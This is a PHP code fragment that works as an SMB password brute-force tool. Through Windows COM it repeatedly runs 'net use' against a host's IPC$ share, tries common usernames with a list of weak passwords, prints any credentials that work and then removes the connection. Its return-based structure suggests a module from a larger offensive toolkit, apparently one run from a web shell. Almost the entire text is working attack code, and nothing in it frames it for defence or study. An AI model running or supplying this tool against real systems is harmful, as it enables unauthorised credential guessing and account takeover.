ob_start();

if (!class_exists('COM')) {
    ob_end_clean();
    return "ERROR: COM not available (Windows only)";
}

$host = '127.0.0.1';
$delay = 1;

$usernames = ['Administrator', 'admin', 'guest', 'root', 'user', 'test'];
$passwords = [
    '',
    'password',
    '123456',
    'admin',
    'guest',
    '12345',
    '123456789',
    'qwerty',
    'letmein',
    'P@ssw0rd'
];

try {
    $output = "[+] Starting SMB brute-force on \\\\$host\\IPC\$\n";
    $output .= "[+] Users to try: " . count($usernames) . "\n";
    $output .= "[+] Passwords per user: " . count($passwords) . "\n\n";

    $total = 0;
    $found = false;

    foreach ($usernames as $user) {
        foreach ($passwords as $pass) {
            $total++;
            $output .= "[$total] Trying: $user / " . ($pass === '' ? '(empty)' : $pass) . " ... ";

            //
            $safe_user = str_replace('"', '""', $user);
            $safe_pass = str_replace('"', '""', $pass);

            $cmd = "cmd.exe /c \"net use \\\\\\\\$host\\\\IPC\\$ \"\"$safe_pass\"\" /user:\"$safe_user\" >nul 2>&1 && echo SUCCESS || echo FAILED\"";

            $wsh = new COM('WScript.Shell');
            $exec = $wsh->Exec($cmd);
            $result = '';
            while (!$exec->StdOut->AtEndOfStream) {
                $result .= $exec->StdOut->ReadLine();
            }
            $wsh = null;

            if (trim($result) === 'SUCCESS') {
                $output .= "SUCCESS!\n";
                $output .= "\n[+] CREDENTIALS FOUND:\n";
                $output .= "    Host: $host\n";
                $output .= "    User: $user\n";
                $output .= "    Pass: " . ($pass === '' ? '(empty)' : $pass) . "\n";

                //
                $cleanup = new COM('WScript.Shell');
                $cleanup->Run("cmd.exe /c net use \\\\\\\\$host\\\\IPC\\$ /delete >nul 2>&1", 0, true);
                $cleanup = null;

                $found = true;
                break 2;
            } else {
                $output .= "FAILED\n";
            }

            if (!$found && $total < (count($usernames) * count($passwords))) {
                sleep($delay);
            }
        }
    }

    if (!$found) {
        $output .= "\n[!] No valid SMB credentials found.\n";
    }

    ob_end_clean();
    return $output;

} catch (Exception $e) {
    ob_end_clean();
    return "ERROR: SMB brute-force (COM) failed - " . $e->getMessage();
}
